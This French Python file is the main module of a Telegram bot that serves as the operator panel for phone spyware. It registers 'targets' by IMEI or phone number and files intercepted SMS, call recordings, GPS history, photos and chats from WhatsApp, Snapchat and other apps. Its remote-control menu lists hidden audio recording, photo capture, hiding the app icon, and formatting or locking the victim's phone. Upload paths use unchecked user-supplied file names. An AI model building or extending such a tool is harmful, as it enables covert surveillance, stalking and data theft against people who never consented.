# main.py (version corrigée avec menu permanent)
import os
import logging
from datetime import datetime
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    ConversationHandler,
    filters
)
import database
import file_manager
import report_generator
from config import BOT_TOKEN, ADMIN_IDS, DATA_PATH, DB_NAME

# Initialisation de la base de données
database.init_db(DB_NAME)

# Configuration des états de conversation
MAIN_MENU, CATEGORY_SELECTION, SUBCATEGORY_SELECTION, FILE_OPERATION = range(4)

# Configurez le logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Structure complète du menu
MENU_STRUCTURE = {
    "📱 SMS/MMS": {
        "folder": "sms_mms",
        "submenu": [
            "Suivi des SMS et MMS",
            "Alerte SMS"
        ]
    },
    "📞 Appels": {
        "folder": "appels",
        "submenu": [
            "Suivi des journaux d'appels",
            "Enregistrement des appels",
            "Blocage des appels"
        ]
    },
    "📍 Localisation": {
        "folder": "localisations",
        "submenu": [
            "Historique des positions GPS",
            "Suivi en temps réel"
        ]
    },
    "🖼️ Photos & Vidéos": {
        "folder": "photos",
        "submenu": [
            "Visualiser les photos et images"
        ]
    },
    "💬 Messagerie instantanée": {
        "folder": "messageries",
        "submenu": [
            "WhatsApp", "Facebook Messenger", "Skype", "Hangouts", "LINE",
            "Kik", "Viber", "Gmail", "Tango", "Snapchat", "Telegram"
        ]
    },
    "🎙️ Contrôle à distance": {
        "folder": "controle_distance",
        "submenu": [
            "Enregistrement audio",
            "Prendre une photo",
            "Commande SMS",
            "Faire vibrer/sonner",
            "Envoyer message vocal",
            "Envoyer popup texte",
            "Envoyer SMS externe",
            "Position GPS",
            "Capture d'écran",
            "Récupérer données",
            "Info téléphone",
            "Cacher/Voir icône",
            "Activer/Désactiver Wi-Fi",
            "Redémarrer téléphone",
            "Formater téléphone",
            "Bloquer téléphone"
        ]
    },
    "📺 Visualisation en direct": {
        "folder": "visualisation_directe",
        "submenu": [
            "Audio/Vidéo/Screen"
        ]
    },
    "📁 Gestionnaire de fichiers": {
        "folder": "fichiers",
        "submenu": [
            "Explorateur de fichiers"
        ]
    },
    "⏱ Restriction d'horaire": {
        "folder": "restrictions",
        "submenu": [
            "Restreindre utilisation"
        ]
    },
    "📱 Applications": {
        "folder": "applications",
        "submenu": [
            "Suivi applications installées",
            "Blocage des applications"
        ]
    },
    "🌐 Sites Web": {
        "folder": "sites_web",
        "submenu": [
            "Historique des sites",
            "Blocage des sites"
        ]
    },
    "📅 Calendrier": {
        "folder": "calendrier",
        "submenu": [
            "Historique des événements"
        ]
    },
    "👤 Contacts": {
        "folder": "contacts",
        "submenu": [
            "Suivi des nouveaux contacts"
        ]
    },
    "📊 Outils d'analyse": {
        "folder": "analyse",
        "submenu": [
            "Statistiques",
            "Rapport PDF/Excel/CSV"
        ]
    }
}

def get_persistent_keyboard():
    """Clavier permanent visible dans tous les états"""
    return [
        ["📱 SMS/MMS", "📞 Appels", "📍 Localisation"],
        ["🖼️ Photos & Vidéos", "💬 Messagerie", "🎙️ Contrôle"],
        ["📁 Fichiers", "📋 Admin", "🔄 Actualiser"]
    ]

def get_main_category_keyboard():
    """Clavier principal avec catégories"""
    return [
        ["📱 SMS/MMS", "📞 Appels", "📍 Localisation"],
        ["🖼️ Photos & Vidéos", "💬 Messagerie instantanée", "🎙️ Contrôle à distance"],
        ["📺 Visualisation en direct", "📁 Gestionnaire de fichiers", "⏱ Restriction d'horaire"],
        ["📱 Applications", "🌐 Sites Web", "📅 Calendrier"],
        ["👤 Contacts", "📊 Outils d'analyse", "🔍 Changer d'appareil"]
    ]

def get_admin_keyboard():
    return [
        ["📋 Liste des cibles", "🗑️ Supprimer une cible"],
        ["📈 Statistiques", "📤 Exporter les logs"],
        ["⬅️ Retour au menu principal"]
    ]

async def return_to_categories(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Retour au menu des catégories avec clavier permanent"""
    device_id = context.user_data.get('current_device', 'Nouvel appareil')
    keyboard = get_persistent_keyboard()
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    
    await update.message.reply_text(
        f"Retour au menu principal pour {device_id}:",
        reply_markup=reply_markup
    )
    return CATEGORY_SELECTION

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Démarre ou réinitialise la conversation"""
    context.user_data.clear()
    keyboard = get_persistent_keyboard()
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    
    await update.message.reply_text(
        "🔍 Entrez un IMEI, numéro de série ou numéro de téléphone...",
        reply_markup=reply_markup
    )
    return MAIN_MENU

async def handle_device_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la saisie de l'identifiant de l'appareil"""
    try:
        user_input = update.message.text.strip()
        keyboard = get_persistent_keyboard()
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        
        if file_manager.validate_device_id(user_input):
            file_manager.create_device_folder(user_input)
            context.user_data['current_device'] = user_input
            
            await update.message.reply_text(
                f"✅ Dossier créé pour : {user_input}\nSélectionnez une catégorie :",
                reply_markup=reply_markup
            )
            return CATEGORY_SELECTION
        else:
            await update.message.reply_text(
                "❌ Format invalide. Veuillez réessayer.",
                reply_markup=reply_markup
            )
            return MAIN_MENU
    except Exception as e:
        logger.error(f"Erreur dans handle_device_id: {str(e)}")
        return await start(update, context)

async def handle_category_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la sélection de catégorie principale"""
    try:
        category = update.message.text
        device_id = context.user_data.get('current_device')
        keyboard = get_persistent_keyboard()
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        
        if not device_id:
            await update.message.reply_text(
                "❌ Session expirée. Veuillez recommencer.",
                reply_markup=reply_markup
            )
            return MAIN_MENU
        
        # Gestion des commandes spéciales
        if category == "📋 Admin":
            return await admin_command(update, context)
        elif category == "🔄 Actualiser":
            await update.message.reply_text(
                "🔄 Interface actualisée",
                reply_markup=reply_markup
            )
            return CATEGORY_SELECTION
        elif category == "🔍 Changer d'appareil":
            return await start(update, context)
        
        # Vérifier si la catégorie existe dans la structure
        if category in MENU_STRUCTURE:
            # Stocker la catégorie principale
            context.user_data['current_main_category'] = category
            main_category = MENU_STRUCTURE[category]
            
            # Préparer le sous-menu
            submenu = main_category.get('submenu', [])
            if submenu:
                # Créer le clavier pour le sous-menu
                submenu_keyboard = []
                for i in range(0, len(submenu), 2):
                    submenu_keyboard.append(submenu[i:i+2])
                
                # Ajouter le bouton de retour
                submenu_keyboard.append(["⬅️ Retour aux catégories"])
                
                reply_markup = ReplyKeyboardMarkup(submenu_keyboard, resize_keyboard=True)
                
                await update.message.reply_text(
                    f"🔽 Sous-catégories pour {category} :",
                    reply_markup=reply_markup
                )
                return SUBCATEGORY_SELECTION
            else:
                # Catégorie sans sous-menu
                return await handle_subcategory_selection(update, context, category)
        else:
            await update.message.reply_text(
                "❌ Catégorie non reconnue. Veuillez choisir une option valide :",
                reply_markup=reply_markup
            )
            return CATEGORY_SELECTION
    
    except Exception as e:
        logger.error(f"Erreur dans handle_category_selection: {str(e)}")
        keyboard = get_persistent_keyboard()
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        await update.message.reply_text(
            "❌ Erreur critique. Utilisez /start pour réinitialiser.",
            reply_markup=reply_markup
        )
        return ConversationHandler.END

async def handle_subcategory_selection(update: Update, context: ContextTypes.DEFAULT_TYPE, subcategory=None):
    """Gère la sélection de sous-catégorie"""
    try:
        if not subcategory:
            subcategory = update.message.text
        
        device_id = context.user_data.get('current_device')
        main_category = context.user_data.get('current_main_category')
        keyboard = get_persistent_keyboard()
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        
        if not device_id or not main_category:
            await update.message.reply_text(
                "❌ Session expirée. Veuillez recommencer.",
                reply_markup=reply_markup
            )
            return MAIN_MENU
            
        # Gestion du retour
        if subcategory == "⬅️ Retour aux catégories":
            return await return_to_categories(update, context)
        
        # Vérifier si la sous-catégorie est valide
        main_category_data = MENU_STRUCTURE.get(main_category)
        if not main_category_data or subcategory not in main_category_data.get('submenu', []):
            await update.message.reply_text(
                "❌ Sous-catégorie non valide. Veuillez réessayer.",
                reply_markup=reply_markup
            )
            return SUBCATEGORY_SELECTION
        
        # Déterminer le chemin du dossier
        main_folder = main_category_data['folder']
        # Créer un nom de sous-dossier basé sur la sous-catégorie
        subfolder_name = "".join(filter(str.isalnum, subcategory)).lower()[:20]
        category_path = os.path.join(DATA_PATH, device_id, main_folder, subfolder_name)
        
        # Créer le dossier de catégorie s'il n'existe pas
        os.makedirs(category_path, exist_ok=True)
        
        # Stocker le chemin complet
        context.user_data['current_category'] = category_path
        context.user_data['current_subcategory'] = subcategory
        
        # Lister les fichiers disponibles
        files = file_manager.list_files(category_path)
        
        if files:
            file_keyboard = [[f] for f in files]
            file_keyboard.append(["⬅️ Retour aux catégories", "⬆️ Télécharger un fichier"])
            reply_markup = ReplyKeyboardMarkup(file_keyboard, resize_keyboard=True)
            
            await update.message.reply_text(
                f"📂 Fichiers disponibles dans {subcategory}:\n"
                "Sélectionnez un fichier pour le visualiser ou téléchargez-en un nouveau.",
                reply_markup=reply_markup
            )
        else:
            reply_markup = ReplyKeyboardMarkup([["⬅️ Retour aux catégories", "⬆️ Télécharger un fichier"]], resize_keyboard=True)
            await update.message.reply_text(
                f"ℹ️ Aucun fichier dans {subcategory}.\n"
                "Vous pouvez télécharger un fichier avec le bouton ci-dessous.",
                reply_markup=reply_markup
            )
        
        return FILE_OPERATION
    
    except Exception as e:
        logger.error(f"Erreur dans handle_subcategory_selection: {str(e)}")
        return await return_to_categories(update, context)

async def handle_file_operation(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère les opérations sur les fichiers avec menu permanent"""
    try:
        user_choice = update.message.text
        device_id = context.user_data.get('current_device')
        category_path = context.user_data.get('current_category')
        keyboard = get_persistent_keyboard()
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        
        if not device_id or not category_path:
            await update.message.reply_text(
                "❌ Session expirée. Veuillez recommencer.",
                reply_markup=reply_markup
            )
            return MAIN_MENU
            
        if user_choice == "⬅️ Retour aux catégories":
            return await return_to_categories(update, context)
        
        elif user_choice == "⬆️ Télécharger un fichier":
            # Ajouter l'option de fichier au clavier permanent
            file_keyboard = keyboard + [["⬆️ Télécharger un fichier"]]
            file_reply_markup = ReplyKeyboardMarkup(file_keyboard, resize_keyboard=True)
            
            await update.message.reply_text(
                "⬆️ Envoyez le fichier. Le menu reste disponible :",
                reply_markup=file_reply_markup
            )
            return FILE_OPERATION
        
        else:
            # Traitement de la sélection d'un fichier
            file_path = os.path.join(category_path, user_choice)
            
            if os.path.isfile(file_path):
                # Journaliser la consultation
                file_manager.log_activity(DB_NAME, device_id, "CONSULT", file_path)
                
                # Envoyer le fichier à l'utilisateur
                await context.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=open(file_path, 'rb'),
                    filename=user_choice
                )
                
                # Reafficher le menu des fichiers
                files = file_manager.list_files(category_path)
                file_keyboard = [[f] for f in files]
                file_keyboard.append(["⬅️ Retour aux catégories", "⬆️ Télécharger un fichier"])
                reply_markup = ReplyKeyboardMarkup(file_keyboard, resize_keyboard=True)
                
                await update.message.reply_text(
                    "Sélectionnez une autre action:",
                    reply_markup=reply_markup
                )
            else:
                await update.message.reply_text(
                    "❌ Fichier introuvable. Veuillez choisir un fichier valide.",
                    reply_markup=reply_markup
                )
            
            return FILE_OPERATION
    
    except Exception as e:
        logger.error(f"Erreur dans handle_file_operation: {str(e)}")
        return await return_to_categories(update, context)

async def handle_file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère le téléchargement de fichiers avec menu permanent"""
    try:
        device_id = context.user_data.get('current_device')
        category_path = context.user_data.get('current_category')
        keyboard = get_persistent_keyboard()
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        
        if not device_id or not category_path:
            await update.message.reply_text(
                "❌ Session expirée. Veuillez recommencer.",
                reply_markup=reply_markup
            )
            return MAIN_MENU
            
        if update.message.document:
            file = await context.bot.get_file(update.message.document.file_id)
            file_name = update.message.document.file_name
            file_path = os.path.join(category_path, file_name)
            await file.download_to_drive(file_path)
            
            file_manager.log_activity(DB_NAME, device_id, "UPLOAD", file_path)
            
            await update.message.reply_text(
                f"✅ Fichier {file_name} téléchargé avec succès!",
                reply_markup=reply_markup
            )
            return await return_to_categories(update, context)
        
        await update.message.reply_text(
            "❌ Format de fichier non reconnu.",
            reply_markup=reply_markup
        )
        return FILE_OPERATION
    
    except Exception as e:
        logger.error(f"Erreur dans handle_file_upload: {str(e)}")
        return await return_to_categories(update, context)

# Fonctions admin
async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Affiche le panel d'administration"""
    user_id = update.effective_user.id
    keyboard = get_persistent_keyboard()
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    
    if user_id not in ADMIN_IDS:
        await update.message.reply_text(
            "❌ Accès refusé.",
            reply_markup=reply_markup
        )
        return
    
    admin_keyboard = get_admin_keyboard()
    admin_reply_markup = ReplyKeyboardMarkup(admin_keyboard, resize_keyboard=True)
    
    await update.message.reply_text(
        "🛠️ Panel Admin - Sélectionnez une option:",
        reply_markup=admin_reply_markup
    )
    return CATEGORY_SELECTION

async def list_targets(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Affiche la liste des cibles enregistrées"""
    keyboard = get_persistent_keyboard()
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    
    targets = file_manager.list_devices(DATA_PATH)
    
    if targets:
        response = "📋 Cibles enregistrées:\n" + "\n".join([f"- {t}" for t in targets])
    else:
        response = "ℹ️ Aucune cible enregistrée."
    
    await update.message.reply_text(response, reply_markup=reply_markup)
    return CATEGORY_SELECTION

async def delete_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Supprime une cible spécifique"""
    keyboard = get_persistent_keyboard()
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text(
            "❌ Accès refusé.",
            reply_markup=reply_markup
        )
        return
    
    if not context.args:
        await update.message.reply_text(
            "Usage: /delete_target <id>",
            reply_markup=reply_markup
        )
        return
    
    target_id = context.args[0]
    if file_manager.delete_device_folder(target_id):
        database.delete_device(DB_NAME, target_id)
        await update.message.reply_text(
            f"✅ Cible {target_id} supprimée.",
            reply_markup=reply_markup
        )
    else:
        await update.message.reply_text(
            f"❌ Erreur lors de la suppression de {target_id}.",
            reply_markup=reply_markup
        )
    
    return CATEGORY_SELECTION

async def export_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Exporte les logs d'une cible spécifique"""
    keyboard = get_persistent_keyboard()
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text(
            "❌ Accès refusé.",
            reply_markup=reply_markup
        )
        return
    
    if not context.args:
        await update.message.reply_text(
            "Usage: /export <id> [csv|pdf]",
            reply_markup=reply_markup
        )
        return
    
    target_id = context.args[0]
    format_type = context.args[1] if len(context.args) > 1 else "csv"
    
    try:
        if format_type == "csv":
            filename = report_generator.generate_csv(DB_NAME, target_id)
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=open(filename, 'rb'),
                filename=f"{target_id}_logs.csv"
            )
        elif format_type == "pdf":
            filename = report_generator.generate_pdf(DB_NAME, target_id)
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=open(filename, 'rb'),
                filename=f"{target_id}_report.pdf"
            )
        else:
            await update.message.reply_text(
                "❌ Format non supporté. Utilisez 'csv' ou 'pdf'.",
                reply_markup=reply_markup
            )
            return
    except Exception as e:
        logger.error(f"Erreur lors de l'export: {str(e)}")
        await update.message.reply_text(
            "❌ Erreur lors de la génération du rapport.",
            reply_markup=reply_markup
        )
    
    return CATEGORY_SELECTION

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Annule la conversation et réinitialise complètement"""
    context.user_data.clear()
    keyboard = get_persistent_keyboard()
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    
    await update.message.reply_text(
        "✅ Opération annulée. Tapez /start pour recommencer.",
        reply_markup=reply_markup
    )
    return ConversationHandler.END

async def reset_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Commande de réinitialisation explicite"""
    return await start(update, context)

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    """Gère les erreurs de manière robuste"""
    logger.error("Exception lors de la mise à jour du bot:", exc_info=context.error)
    
    if update and isinstance(update, Update):
        try:
            keyboard = get_persistent_keyboard()
            reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
            
            await update.message.reply_text(
                "❌ Une erreur critique s'est produite. "
                "Veuillez utiliser /start pour réinitialiser le bot.\n\n"
                f"Erreur: {str(context.error)[:200]}",
                reply_markup=reply_markup
            )
        except:
            logger.error("Échec d'envoi du message d'erreur")

    return ConversationHandler.END

def run_bot():
    """Démarre le bot avec menu permanent"""
    application = ApplicationBuilder().token(BOT_TOKEN).build()
    
    # Commandes de base
    application.add_handler(CommandHandler('reset', reset_command))
    application.add_handler(CommandHandler('cancel', cancel))
    application.add_handler(CommandHandler('start', start))
    
    # Commandes admin
    application.add_handler(CommandHandler('admin', admin_command))
    application.add_handler(CommandHandler('delete_target', delete_target))
    application.add_handler(CommandHandler('export', export_logs))
    
    # Gestionnaire de conversation principal
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            MAIN_MENU: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_device_id)
            ],
            CATEGORY_SELECTION: [
                MessageHandler(filters.Regex(r'^(📋 Admin|🔄 Actualiser|🔍 Changer d\'appareil)$'), handle_category_selection),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_category_selection)
            ],
            SUBCATEGORY_SELECTION: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_subcategory_selection)
            ],
            FILE_OPERATION: [
                MessageHandler(filters.Document.ALL, handle_file_upload),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_file_operation)
            ]
        },
        fallbacks=[CommandHandler('cancel', cancel)]
    )
    application.add_handler(conv_handler)
    
    # Gestion des erreurs
    application.add_error_handler(error_handler)
    
    # Démarrer le bot
    logger.info("Bot démarré avec succès!")
    application.run_polling()

if __name__ == '__main__':
    run_bot()
